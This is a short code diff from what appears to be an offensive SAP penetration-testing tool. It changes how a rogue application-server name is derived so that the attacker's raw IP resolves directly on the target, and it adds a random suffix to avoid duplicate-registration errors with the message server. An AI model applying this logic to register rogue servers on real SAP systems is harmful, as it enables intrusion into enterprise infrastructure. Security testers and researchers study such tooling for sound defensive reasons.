@@ -1055,8 +1055,13 @@ def _derive_appserver_name(ms_name: str, instance_nr: int,
                             target_sid: str = "") -> str:
     """Derive a unique app-server name using attacker IP as the hostname.
 
-    Format: <ip_with_dots_as_underscores>_<SID>_NN_<random4hex>
-    Example: 192_168_2_11_S4H_00_a3f5
+    Format: <ip_with_dots>_<SID>_NN_<random4hex>
+    Example: 192.168.2.11_S4H_00_a3f5
+
+    The hostname portion KEEPS dots so that SAP's gethostbyname() resolves
+    the raw IP address directly — no /etc/hosts entry needed on the target.
+    Previously dots were replaced with underscores (192_168_2_11), which
+    produced an unresolvable hostname and required an /etc/hosts entry.
 
     A random 4-char hex suffix is appended so each betrusted invocation
     registers a DISTINCT name. Without this, a stale registration from a
@@ -1087,8 +1092,8 @@ def _derive_appserver_name(ms_name: str, instance_nr: int,
                 sid = part
                 break
 
-    # Hostname = attacker IP with dots replaced by underscores
-    hostname = attacker_ip.replace(".", "_") if attacker_ip else "sapmap"
+    # Hostname = attacker IP WITH DOTS (gethostbyname resolves raw IPs directly)
+    hostname = attacker_ip if attacker_ip else "sapmap"
 
     # Random 4-char hex suffix ensures every invocation uses a unique name,
     # preventing MSENOTUNIQUE rejections from stale prior registrations.
